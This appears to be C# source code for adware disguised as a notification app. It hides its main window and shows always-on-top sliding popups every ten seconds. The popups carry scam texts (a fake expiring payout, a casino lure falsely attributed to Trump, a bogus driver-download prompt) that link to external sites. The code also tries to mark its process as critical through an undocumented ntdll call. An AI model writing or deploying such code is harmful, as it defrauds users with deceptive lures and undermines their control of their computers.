using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Reflection; // Для работы с ресурсами
using System.IO; // Для работы с потоками

namespace NotificationApp
{
    public enum Edge { Top, Bottom, Left, Right }

    public class NotificationForm : Form
    {
        public enum State { Hidden, SlidingOut, OnScreen, SlidingBack }
        public State CurrentState { get; private set; } = State.Hidden;

        private Timer animationTimer;
        private Edge currentEdge;
        private int targetX, targetY;
        private int stepX, stepY;
        private Action onSlideOutComplete;
        private Action onSlideBackComplete;

        private PictureBox pictureBox;
        private LinkLabel linkLabel;

        public NotificationForm(int width, int height, float fontSize)
        {
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;
            this.ShowInTaskbar = false;
            this.Size = new Size(width, height);

            pictureBox = new PictureBox
            {
                Size = new Size(height - 20, height - 20),
                Location = new Point(10, 10),
                SizeMode = PictureBoxSizeMode.StretchImage
            };
            linkLabel = new LinkLabel
            {
                AutoSize = true,
                Location = new Point(height + 10, 10),
                MaximumSize = new Size(width - height - 20, 0),
                Font = new Font("Arial", fontSize, FontStyle.Regular),
                LinkColor = Color.Black,
                ActiveLinkColor = Color.Red,
                VisitedLinkColor = Color.Purple
            };
            linkLabel.LinkClicked += (sender, e) =>
            {
                if (linkLabel.Tag != null)
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = linkLabel.Tag.ToString(),
                        UseShellExecute = true
                    });
                }
            };
            this.Controls.Add(pictureBox);
            this.Controls.Add(linkLabel);

            animationTimer = new Timer { Interval = 10 };
            animationTimer.Tick += AnimationTimer_Tick;
        }

        public void StartSlideOut(Edge edge, Image image, string text, string url, Action onComplete = null)
        {
            if (CurrentState != State.Hidden) return;

            currentEdge = edge;
            pictureBox.Image = image;
            linkLabel.Text = text;
            linkLabel.Tag = url;

            var workingArea = Screen.PrimaryScreen.WorkingArea;

            switch (edge)
            {
                case Edge.Top:
                    this.Left = (workingArea.Width - this.Width) / 2 + workingArea.X;
                    this.Top = workingArea.Y - this.Height;
                    targetX = this.Left;
                    targetY = workingArea.Y;
                    stepX = 0;
                    stepY = 5;
                    break;
                case Edge.Bottom:
                    this.Left = (workingArea.Width - this.Width) / 2 + workingArea.X;
                    this.Top = workingArea.Bottom;
                    targetX = this.Left;
                    targetY = workingArea.Bottom - this.Height;
                    stepX = 0;
                    stepY = -5;
                    break;
                case Edge.Left:
                    this.Left = workingArea.X - this.Width;
                    this.Top = (workingArea.Height - this.Height) / 2 + workingArea.Y;
                    targetX = workingArea.X;
                    targetY = this.Top;
                    stepX = 5;
                    stepY = 0;
                    break;
                case Edge.Right:
                    this.Left = workingArea.Right;
                    this.Top = (workingArea.Height - this.Height) / 2 + workingArea.Y;
                    targetX = workingArea.Right - this.Width;
                    targetY = this.Top;
                    stepX = -5;
                    stepY = 0;
                    break;
            }

            this.Visible = true;
            CurrentState = State.SlidingOut;
            onSlideOutComplete = onComplete;
            animationTimer.Start();
        }

        public void StartSlideBack(Action onComplete = null)
        {
            if (CurrentState != State.OnScreen) return;

            var workingArea = Screen.PrimaryScreen.WorkingArea;

            switch (currentEdge)
            {
                case Edge.Top:
                    targetY = workingArea.Y - this.Height;
                    stepX = 0;
                    stepY = -5;
                    break;
                case Edge.Bottom:
                    targetY = workingArea.Bottom;
                    stepX = 0;
                    stepY = 5;
                    break;
                case Edge.Left:
                    targetX = workingArea.X - this.Width;
                    stepX = -5;
                    stepY = 0;
                    break;
                case Edge.Right:
                    targetX = workingArea.Right;
                    stepX = 5;
                    stepY = 0;
                    break;
            }

            CurrentState = State.SlidingBack;
            onSlideBackComplete = onComplete;
            animationTimer.Start();
        }

        private void AnimationTimer_Tick(object sender, EventArgs e)
        {
            this.Left += stepX;
            this.Top += stepY;

            bool reachedX = (stepX > 0 && this.Left >= targetX) || (stepX < 0 && this.Left <= targetX) || stepX == 0;
            bool reachedY = (stepY > 0 && this.Top >= targetY) || (stepY < 0 && this.Top <= targetY) || stepY == 0;

            if (reachedX && reachedY)
            {
                this.Left = targetX;
                this.Top = targetY;
                animationTimer.Stop();

                if (CurrentState == State.SlidingOut)
                {
                    CurrentState = State.OnScreen;
                    onSlideOutComplete?.Invoke();
                }
                else if (CurrentState == State.SlidingBack)
                {
                    this.Visible = false;
                    CurrentState = State.Hidden;
                    onSlideBackComplete?.Invoke();
                }
            }
        }
    }

    public class MainForm : Form
    {
        private NotificationForm notificationForm;
        private Timer notificationTimer;
        private Random random = new Random();
        private int counter = 0;

        private string[] messages = { "You have not received your payout for 02.03.24! Collect them at the link https://prizewheel.github.io/analiticbet/ within 24 hours, otherwise they will be burned.", "Trump admitted: HIS MAIN WAY OF EARNING IS NORTONCASINO And you're still working for pennies. What are you waiting for?", "Your file(1) is ready to download. Install Driver Booster and continue with the installation." };
        // Имена ресурсов (соответствуют именам файлов в проекте)
        private string[] imageResourceNames = 
        {
            "NotificationApp.1.jpg", // Имя файла в проекте + пространство имён
            "NotificationApp.2.png",
            "NotificationApp.3.jpg"
        };
        private string[] urls = 
        {
            "https://prizewheel.github.io/analiticbet",
            "https://restorantan.ru",
            "https://www.iobit.com"
        };

        private readonly int notificationWidth = 700;
        private readonly int notificationHeight = 400;
        private readonly float fontSize = 16f;

        public MainForm()
        {
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;

            notificationForm = new NotificationForm(notificationWidth, notificationHeight, fontSize);

            notificationTimer = new Timer { Interval = 10000 };
            notificationTimer.Tick += NotificationTimer_Tick;
            notificationTimer.Start();

            ShowNextNotification();
        }

        private void NotificationTimer_Tick(object sender, EventArgs e)
        {
            if (notificationForm.CurrentState == NotificationForm.State.OnScreen)
            {
                notificationForm.StartSlideBack(() => ShowNextNotification());
            }
            else if (notificationForm.CurrentState == NotificationForm.State.Hidden)
            {
                ShowNextNotification();
            }
        }

        private void ShowNextNotification()
        {
            string text = messages[counter % messages.Length];
            string resourceName = imageResourceNames[counter % imageResourceNames.Length];
            string url = urls[counter % urls.Length];

            Image image;
            try
            {
                // Загрузка изображения из встроенного ресурса
                Assembly assembly = Assembly.GetExecutingAssembly();
                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null)
                        throw new Exception($"Ресурс {resourceName} не найден.");
                    image = Image.FromStream(stream);
                }
            }
            catch (Exception ex)
            {
                // Если ресурс не найден, используем заглушку
                image = new Bitmap(notificationHeight - 20, notificationHeight - 20);
                using (Graphics g = Graphics.FromImage(image))
                {
                    g.Clear(Color.Red);
                    g.DrawString("Ошибка", new Font("Arial", 12), Brushes.White, 10, 10);
                }
                Console.WriteLine($"Не удалось загрузить изображение {resourceName}: {ex.Message}");
            }

            counter++;
            Edge edge = (Edge)random.Next(0, 4);
            notificationForm.StartSlideOut(edge, image, text, url);
        }
    }

    static class Program
    {
        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr Handle, int processInformationClass, ref int processInformation, int processInformationLength);

        [STAThread]
        static void Main()
        {
            if (Environment.OSVersion.Version.Major >= 6)
            {
                SetProcessDPIAware();
            }

            // Установка процесса как критичного
            int isCritical = 0;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}